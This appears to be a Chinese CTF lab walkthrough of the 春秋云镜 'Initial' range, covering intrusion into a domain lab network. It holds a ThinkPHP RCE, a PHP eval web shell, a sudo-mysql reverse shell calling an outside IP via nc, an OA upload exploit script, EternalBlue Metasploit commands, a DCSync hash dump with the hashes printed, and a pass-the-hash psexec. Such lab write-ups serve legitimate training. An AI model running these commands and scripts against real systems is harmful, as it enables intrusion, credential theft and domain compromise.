---
title: "春秋云镜 Initial"
onlyTitle: true
date: 2025-10-13 17:14:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8172.png
---





## 春秋云镜 Initial

### flag1

fscan扫出可以用thinphp5023 rce的poc

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013134256675.png)

Thinkphp工具一把梭

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013140022053.png)

直接写一句话马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013140559079.png)

上线后是低权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013140629468.png)

sudo -l 发现mysql为root权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013140722525.png)

发现了高权限的sudo命令可以直接上GTFObins，查看对应命令可用的提权手法（提权大字典文档）

https://gtfobins.github.io/

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013141130142.png)

找到mysql的sudo提权命令

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013141230291.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013141513349.png)

可以弹个shell出来，我图方便就直接写ssh公钥然后xshell连接了，结果写上去了，一直连不上，不懂，还是弹了shell出来

```sh
sudo mysql -e '\! rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.72.74.197 1999 >/tmp/f'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013144607992.png)

flag01: flag{60b53231-



### flag2

ifconfig看网段属于172.22.1.15/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013144920160.png)

蚁剑上传fscan，然后用root shell执行：

chmod 777 FScan_2.0.1_linux_x64

./FScan_2.0.1_linux_x64 -h 172.22.1.15/24

一共四台主机

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013145309135.png)

```
172.22.1.15 本机
172.22.1.2 Win2016 xiaorang.lab域 DC01应该是域控
172.22.1.21 win2008 xiaorang.lab域 存在ms17010
172.22.1.18 win2012 xiaorang.lab域 存在信呼OA
```

先挂内网代理，gost + proxifier

```sh
./gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/39.98.119.102:22 -F socks5://39.98.119.102:5555
```

信呼oa 2.2.8

![](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20251013150449783.png)

弱密码admin admin123，现成脚本改个账密即可使用

```python
import requests
session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir")
print(r.text)
print(filepath)

```

1.php：

```php
<?php @eval($_POST['godown']); ?>
```

连上后直接发现是system域用户，主机最高权限了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013150952168.png)

flag02: 2ce3-4813-87d4-

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013151114283.png)



### flag3

妈的虚拟机一直没网，真是出生虚拟机，再用虚拟机我就是狗

打172.22.1.21永恒之蓝

windows msf:https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/

```shell
msfconsole.bat
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
show options 
set rhosts 172.22.1.21
run
```

有时候可能会弹不回来，多弹两次，栈溢出是这样的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013160705755.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013160802297.png)

直接用msf自带的mimikatz，也就是kiwi去dumphash

```cmd
load kiwi
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
```

当然也可以创建用户，rdp上去传mimikatz使用（可以吗？创建的用户好像不属于域

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013161003919.png)

```sh
meterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
1000    DC01$   1183494693693a35d7dcdfab8301178e        532480
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
1104    XIAORANG-OA01$  1a2615dcdfc34f3e0e6ff8983fecb356        4096
1108    XIAORANG-WIN7$  eef3c5370a9cb58d1f3ea725e0743233        4096
```

得到域控hash 10cf89a850fb1cdbe6bb432b859164c8

直接用impacket psexec哈希传递

```sh
python psexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013161739120.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013161909974.png)

flag03: e8f88d0d43d6}

flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}



那么我请问了，18也是system用户，为什么不直接在18上面dump hash？

我确实尝试dump了一下，结果什么也没有

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251013163230137.png)

SharpHound收集了一波，但是忘把压缩包下下来就关靶机了。。想起来应该是18对域控有DCSync权限，才能dump hash

另外msf reverse弹不出shell的话目标不能主动出网，用bind去主动连接

另外ms17010可以不用msf，麻烦，有UI工具：

https://github.com/abc123info/EquationToolsGUI